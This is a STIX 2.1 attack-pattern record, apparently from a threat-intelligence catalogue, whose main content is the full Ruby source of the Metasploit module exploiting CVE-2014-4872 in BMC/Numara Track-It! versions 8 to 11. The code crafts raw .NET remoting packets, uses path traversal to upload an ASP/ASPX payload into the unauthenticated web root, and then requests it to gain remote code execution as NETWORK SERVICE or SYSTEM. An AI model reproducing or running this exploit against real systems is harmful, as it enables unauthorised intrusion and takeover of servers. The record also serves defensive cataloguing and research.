{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37e3f3c4-3e20-4a9d-a1d6-eadb09d60be5",
    "created": "2024-08-14T16:52:41.464223Z",
    "modified": "2024-08-14T16:52:41.464227Z",
    "name": "Numara / BMC Track-It! FileStorageService Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It! v8 to v11.X. The application exposes the FileStorageService .NET remoting service on port 9010 (9004 for version 8) which accepts unauthenticated uploads. This can be abused by a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary code execution as NETWORK SERVICE or SYSTEM. This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107 10.0.0.143, 9.0.30.248 and 8.0.2.51. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/trackit_file_upload.rb",
            "external_id": "trackit_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4872"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Oct/34"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Numara / BMC Track-It! FileStorageService Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It!\n        v8 to v11.X.\n        The application exposes the FileStorageService .NET remoting service on port 9010\n        (9004 for version 8) which accepts unauthenticated uploads. This can be abused by\n        a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary\n        code execution as NETWORK SERVICE or SYSTEM.\n        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,\n        10.0.0.143, 9.0.30.248 and 8.0.2.51.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'    # vulnerability discovery and MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2014-4872' ],\n          [ 'OSVDB', '112741' ],\n          [ 'US-CERT-VU', '121036' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'Numara / BMC Track-It! v9 to v11.X - Windows', {} ],\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-10-07'\n    ))\n\n    register_options(\n      [\n        OptPort.new('RPORT',\n          [true, 'TrackItWeb application port', 80]),\n        OptPort.new('RPORT_REMOTING',\n          [true, '.NET remoting service port', 9010]),\n        OptInt.new('SLEEP',\n          [true, 'Seconds to sleep while we wait for ASP(X) file to be written', 15]),\n        OptString.new('TARGETURI',\n          [true, 'Base path to the TrackItWeb application', '/TrackItWeb/'])\n      ])\n  end\n\n\n  def get_version\n    res = send_request_cgi!({\n      'uri'    => normalize_uri(datastore['TARGETURI']),\n      'method' => 'GET'\n    })\n    if res and res.code == 200 and res.body.to_s =~ /\\/TrackItWeb\\/Content\\.([0-9]{1,2}\\.[0-9]{1,2}\\.[0-9]{1,2}\\.[0-9]{1,4})\\//\n      version = $1.split(\".\")\n      return version\n    end\n  end\n\n\n  def check\n    version = get_version\n    if version != nil\n      if (version[0].to_i < 11) or\n      (version[0].to_i == 11 and version[1].to_i <= 3) or\n      (version[0].to_i == 11 and version[1].to_i == 3 and version[2].to_i == 0 and version[3].to_i < 999)\n        ctx = { 'Msf' => framework, 'MsfExploit' => self }\n        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })\n        if not sock.nil?\n          sock.write(rand_text_alpha(rand(200) + 100))\n          res = sock.recv(1024)\n          if res =~ /Tcp channel protocol violation: expecting preamble/\n            return Exploit::CheckCode::Appears\n          end\n          sock.close\n        end\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n\n  def longest_common_substr(strings)\n    shortest = strings.min_by &:length\n    maxlen = shortest.length\n    maxlen.downto(0) do |len|\n      0.upto(maxlen - len) do |start|\n        substr = shortest[start,len]\n        return substr if strings.all?{|str| str.include? substr }\n      end\n    end\n  end\n\n\n  def get_traversal_path\n    #\n    # ConfigurationService packet structure:\n    #\n    # @packet_header_pre_packet_size\n    # packet_size (4 bytes)\n    # @packet_header_pre_uri_size\n    # uri_size (2 bytes)\n    # @packet_header_pre_uri\n    # uri\n    # @packet_header_post_uri\n    # packet_body_start_pre_method_size\n    # method_size (1 byte)\n    # method\n    # @packet_body_pre_type_size\n    # type_size (1 byte)\n    # @packet_body_pre_type\n    # type\n    # @packet_terminator\n    #\n    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx\n    #\n    packet_body_start_pre_method_size = [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x15, 0x11, 0x00, 0x00, 0x00, 0x12\n    ]\n\n    service = \"TrackIt.Core.ConfigurationService\".gsub(/TrackIt/,(@version == 11 ? \"Trackit\" : \"Numara.TrackIt\"))\n    method = \"GetProductDeploymentValues\".gsub(/TrackIt/,(@version == 11 ? \"Trackit\" : \"Numara.TrackIt\"))\n    type = \"TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null\".gsub(/TrackIt/,(@version == 11 ? \"TrackIt\" : \"Numara.TrackIt\"))\n\n    uri = \"tcp://\" + rhost + \":\" + @remoting_port.to_s + \"/\" + service\n\n    file_storage_dir_str = \"FileStorageDataDirectory\"\n    web_data_dir_str = \"WebDataCacheDirectory\"\n\n    packet_size =\n      @packet_header_pre_uri_size.length +\n      2 + # uri_size\n      @packet_header_pre_uri.length +\n      uri.length +\n      @packet_header_post_uri.length +\n      packet_body_start_pre_method_size.length +\n      1 + # method_size\n      method.length +\n      @packet_body_pre_type_size.length +\n      1 + # type_size\n      @packet_body_pre_type.length +\n      type.length\n\n    # start of packet and packet size (4 bytes)\n    buf = @packet_header_pre_packet_size.pack('C*')\n    buf << Array(packet_size).pack('L*')\n\n    # uri size (2 bytes)\n    buf << @packet_header_pre_uri_size.pack('C*')\n    buf << Array(uri.length).pack('S*')\n\n    # uri\n    buf << @packet_header_pre_uri.pack('C*')\n    buf << uri.bytes.to_a.pack('C*')\n    buf << @packet_header_post_uri.pack('C*')\n\n    # method name\n    buf << packet_body_start_pre_method_size.pack('C*')\n    buf << Array(method.length).pack('C*')\n    buf << method.bytes.to_a.pack('C*')\n\n    # type name\n    buf << @packet_body_pre_type_size.pack('C*')\n    buf << Array(type.length).pack('C*')\n    buf << @packet_body_pre_type.pack('C*')\n    buf << type.bytes.to_a.pack('C*')\n\n    buf << @packet_terminator.pack('C*')\n\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{@remoting_port.to_s} - Failed to connect to remoting service\")\n    else\n      print_status(\"#{rhost}:#{@remoting_port} - Getting traversal path...\")\n    end\n    sock.write(buf)\n\n    # read from the socket for up to (SLEEP / 2) seconds\n    counter = 0\n    web_data_dir = nil\n    file_storage_dir = nil\n    while counter < datastore['SLEEP']\n      begin\n        readable,writable,error = IO.select([sock], nil, nil, datastore['SLEEP'] / 2)\n        if readable == nil\n          break\n        else\n          sock = readable[0]\n        end\n        buf_reply = sock.readpartial(4096)\n        if (index = (buf_reply.index(file_storage_dir_str))) != nil\n          # after file_storage_dir_str, discard 5 bytes then get file_storage_dir_size\n          size = buf_reply[index + file_storage_dir_str.length + 5,1].unpack('C*')[0]\n          file_storage_dir = buf_reply[index + file_storage_dir_str.length + 6, size]\n          if file_storage_dir != nil and web_data_dir != nil\n            break\n          end\n        end\n        if (index = (buf_reply.index(web_data_dir_str))) != nil\n          # after web_data_dir_str, discard 5 bytes then get web_data_dir_size\n          size = buf_reply[index + web_data_dir_str.length + 5,1].unpack('C*')[0]\n          web_data_dir = buf_reply[index + web_data_dir_str.length + 6, size]\n          if file_storage_dir != nil and web_data_dir != nil\n            break\n          end\n        end\n        counter += 1\n        sleep(0.5)\n      rescue SystemCallError\n        break\n      end\n    end\n    sock.close\n\n    if file_storage_dir != nil and web_data_dir != nil\n      # Now we need to adjust the paths before we calculate the traversal_size\n      # On the web_data_dir, trim the last part (the Cache directory) and add the Web\\Installers part\n      # which is the path accessible without authentication.\n      # On the file_storage_dir, add the IncidentRepository part where the files land by default.\n      # We then find the common string and calculate the traversal_path.\n      web_data_dir = web_data_dir[0,web_data_dir.rindex(\"\\\\\")] + \"\\\\Web\\\\Installers\\\\\"\n      file_storage_dir << \"\\\\Repositories\\\\IncidentRepository\"\n      common_str = longest_common_substr([file_storage_dir, web_data_dir])\n      traversal_size =  file_storage_dir[common_str.rindex(\"\\\\\"), file_storage_dir.length].scan(\"\\\\\").length\n      traversal_path = \"..\\\\\" * traversal_size + web_data_dir[common_str.rindex(\"\\\\\") + 1,common_str.length]\n      return traversal_path\n    else\n      return nil\n    end\n    # Note: version 8 always returns nil as the GetProductDeploymentValues does not exist\n  end\n\n\n  def send_file(traversal_path, filename, file_content)\n    #\n    # FileStorageService packet structure:\n    #\n    # @packet_header_pre_packet_size\n    # packet_size (4 bytes)\n    # @packet_header_pre_uri_size\n    # uri_size (2 bytes)\n    # @packet_header_pre_uri\n    # uri\n    # @packet_header_post_uri\n    # packet_body_start_pre_method_size\n    # method_size (1 byte)\n    # method\n    # @packet_body_pre_type_size\n    # type_size (1 byte)\n    # @packet_body_pre_type\n    # type\n    # packet_body_pre_repository_size\n    # repository_size (1 byte)\n    # repository\n    # packet_body_pre_filepath_size\n    # filepath_size (1 byte)\n    # filepath\n    # packet_body_pre_binary_lib_size\n    # binary_lib_size (1 byte)\n    # binary_lib\n    # packet_body_pre_file_content_decl_size\n    # file_content_decl_size (1 byte)\n    # file_content_decl\n    # packet_body_pre_filesize\n    # file_size (4 bytes)\n    # packet_body_pre_filecontent\n    # file_content\n    # @packet_terminator\n    #\n    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx\n    #\n    packet_body_start_pre_method_size = [\n      0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff,\n      0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x15, 0x14, 0x00, 0x00, 0x00, 0x12\n    ]\n\n    packet_body_pre_repository_size = [\n      0x10, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,\n      0x00, 0x0a, 0x09, 0x02, 0x00, 0x00, 0x00, 0x06,\n      0x03, 0x00, 0x00, 0x00\n    ]\n\n    packet_body_pre_filepath_size = [\n      0x06, 0x04, 0x00, 0x00, 0x00\n    ]\n\n    packet_body_pre_binary_lib_size = [\n      0x0c, 0x05, 0x00, 0x00, 0x00\n    ]\n\n    packet_body_pre_file_content_decl_size = [\n      0x05, 0x02, 0x00, 0x00, 0x00\n    ]\n\n    packet_body_pre_file_size = [\n      0x01, 0x00, 0x00, 0x00, 0x09, 0x5f, 0x72, 0x61,\n      0x77, 0x42, 0x79, 0x74, 0x65, 0x73, 0x07, 0x02,\n      0x05, 0x00, 0x00, 0x00, 0x09, 0x06, 0x00, 0x00,\n      0x00, 0x0f, 0x06, 0x00, 0x00, 0x00\n    ]\n\n    packet_body_pre_filecontent = [ 0x02 ]\n\n    service = \"TrackIt.Core.FileStorageService\".gsub(/TrackIt/,(@version == 11 ? \"TrackIt\" : \"Numara.TrackIt\"))\n    method = \"Create\"\n    type = \"TrackIt.Core.FileStorage.IFileStorageSecureDelegator, TrackIt.Core.FileStorage, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null\".gsub(/TrackIt/,(@version == 11 ? \"TrackIt\" : \"Numara.TrackIt\"))\n    repository = \"IncidentRepository\"\n    binary_lib = \"TrackIt.Core.FileStorage, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null\".gsub(/TrackIt/,(@version == 11 ? \"TrackIt\" : \"Numara.TrackIt\"))\n    file_content_decl = \"TrackIt.Core.FileStorage.FileContent\".gsub(/TrackIt/,(@version == 11 ? \"TrackIt\" : \"Numara.TrackIt\"))\n\n    uri = \"tcp://\" + rhost + \":\" + @remoting_port.to_s + \"/\" + service\n\n    filepath = traversal_path + filename\n\n    packet_size =\n      @packet_header_pre_uri_size.length +\n      2 + # uri_size\n      @packet_header_pre_uri.length +\n      uri.length +\n      @packet_header_post_uri.length +\n      packet_body_start_pre_method_size.length +\n      1 + # method_size\n      method.length +\n      @packet_body_pre_type_size.length +\n      1 + # type_size\n      @packet_body_pre_type.length +\n      type.length +\n      packet_body_pre_repository_size.length +\n      1 + # repository_size\n      repository.length +\n      packet_body_pre_filepath_size.length +\n      1 + # filepath_size\n      filepath.length +\n      packet_body_pre_binary_lib_size.length +\n      1 + # binary_lib_size\n      binary_lib.length +\n      packet_body_pre_file_content_decl_size.length +\n      1 + # file_content_decl_size\n      file_content_decl.length +\n      packet_body_pre_file_size.length +\n      4 + # file_size\n      packet_body_pre_filecontent.length +\n      file_content.length\n\n    # start of packet and packet size (4 bytes)\n    buf = @packet_header_pre_packet_size.pack('C*')\n    buf << Array(packet_size).pack('L*')\n\n    # uri size (2 bytes)\n    buf << @packet_header_pre_uri_size.pack('C*')\n    buf << Array(uri.length).pack('S*')\n\n    # uri\n    buf << @packet_header_pre_uri.pack('C*')\n    buf << uri.bytes.to_a.pack('C*')\n    buf << @packet_header_post_uri.pack('C*')\n\n    # method name\n    buf << packet_body_start_pre_method_size.pack('C*')\n    buf << Array(method.length).pack('C*')\n    buf << method.bytes.to_a.pack('C*')\n\n    # type name\n    buf << @packet_body_pre_type_size.pack('C*')\n    buf << Array(type.length).pack('C*')\n    buf << @packet_body_pre_type.pack('C*')\n    buf << type.bytes.to_a.pack('C*')\n\n    # repository name\n    buf << packet_body_pre_repository_size.pack('C*')\n    buf << Array(repository.length).pack('C*')\n    buf << repository.bytes.to_a.pack('C*')\n\n    # filepath\n    buf << packet_body_pre_filepath_size.pack('C*')\n    buf << Array(filepath.length).pack('C*')\n    buf << filepath.bytes.to_a.pack('C*')\n\n    # binary lib name\n    buf << packet_body_pre_binary_lib_size.pack('C*')\n    buf << Array(binary_lib.length).pack('C*')\n    buf << binary_lib.bytes.to_a.pack('C*')\n\n    # file content decl\n    buf << packet_body_pre_file_content_decl_size.pack('C*')\n    buf << Array(file_content_decl.length).pack('C*')\n    buf << file_content_decl.bytes.to_a.pack('C*')\n\n    # file size (4 bytes)\n    buf << packet_body_pre_file_size.pack('C*')\n    buf << Array(file_content.length).pack('L*')\n\n    # file contents\n    buf << packet_body_pre_filecontent.pack('C*')\n    buf << file_content\n\n    buf << @packet_terminator.pack('C*')\n\n    # send the packet and ignore the response\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{@remoting_port.to_s} - Failed to connect to remoting service\")\n    else\n      print_status(\"#{rhost}:#{@remoting_port} - Uploading payload to #{filename}\")\n    end\n    sock.write(buf)\n    sock.close\n    # We can't really register our files for cleanup as most of the time we run under the IIS user, not SYSTEM\n  end\n\n\n  def exploit\n    @packet_header_pre_packet_size= [\n      0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,\n      0x00, 0x00\n    ]\n\n    @packet_header_pre_uri_size = [\n      0x04, 0x00, 0x01, 0x01\n    ]\n\n    @packet_header_pre_uri = [\n      0x00, 0x00\n    ]\n\n    # contains binary type (application/octet-stream)\n    @packet_header_post_uri = [\n      0x06, 0x00, 0x01, 0x01, 0x18, 0x00, 0x00, 0x00,\n      0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74,\n      0x69, 0x6f, 0x6e, 0x2f, 0x6f, 0x63, 0x74, 0x65,\n      0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d,\n      0x00, 0x00\n    ]\n\n    @packet_body_pre_type_size = [ 0x12 ]\n\n    @packet_body_pre_type = [ 0x01 ]\n\n    @packet_terminator = [ 0x0b ]\n\n    version = get_version\n    if version != nil\n      @version = version[0].to_i\n    else\n      # We assume it's version 9 or below because we couldn't find any version identifiers\n      @version = 9\n    end\n\n    @remoting_port = datastore['RPORT_REMOTING']\n\n    traversal_path = get_traversal_path\n    if traversal_path == nil\n      print_error(\"#{rhost}:#{@remoting_port} - Could not get traversal path, falling back to defaults\")\n      case @version\n      when 9\n        traversal_path = \"..\\\\..\\\\..\\\\..\\\\Web Add-On\\\\Web\\\\Installers\\\\\"\n      when 10\n        traversal_path = \"..\\\\..\\\\..\\\\..\\\\..\\\\Numara Track-It! Web\\\\Web\\\\Installers\\\\\"\n      when 11\n        traversal_path = \"..\\\\..\\\\..\\\\..\\\\..\\\\Track-It! Web\\\\Web\\\\Installers\\\\\"\n      end\n    end\n\n    # generate our payload\n    exe = generate_payload_exe\n    if @version == 9\n      file_content = Msf::Util::EXE.to_exe_asp(exe)\n      filename = rand_text_alpha_lower(rand(6) + 6) + \".asp\"\n    else\n      file_content = Msf::Util::EXE.to_exe_aspx(exe)\n      filename = rand_text_alpha_lower(rand(6) + 6) + \".aspx\"\n    end\n\n    send_file(traversal_path, filename, file_content)\n\n    # sleep a few seconds, sometimes the service takes a while to write to disk\n    sleep(datastore['SLEEP'])\n\n    print_status(\"Executing payload\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], \"Installers\", filename),\n      'method' => 'GET'\n    })\n\n    if res\n      if res.code == 500\n        print_error(\"Got HTTP 500, trying again with \" + (@version == 9 ? \"ASPX\" : \"ASPX\"))\n        # try again but now use ASPX instead of ASP or vice-versa\n        if @version == 9\n          file_content = Msf::Util::EXE.to_exe_aspx(exe)\n          filename = rand_text_alpha_lower(rand(6) + 6) + \".aspx\"\n        else\n          file_content = Msf::Util::EXE.to_exe_asp(exe)\n          filename = rand_text_alpha_lower(rand(6) + 6) + \".asp\"\n        end\n        send_file(traversal_path, filename, file_content)\n\n        # sleep a few seconds, sometimes the service takes a while to write to disk\n        sleep(datastore['SLEEP'])\n\n        print_status(\"Executing payload\")\n        res = send_request_cgi({\n          'uri'    => normalize_uri(datastore['TARGETURI'], \"Installers\", filename),\n          'method' => 'GET'\n        })\n      end\n    end\n    if not res or res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Could not execute payload\" + (res ? \", got HTTP code #{res.code.to_s}\": \"\"))\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-07",
    "x_mitre_platforms": [
        "win'"
    ]
}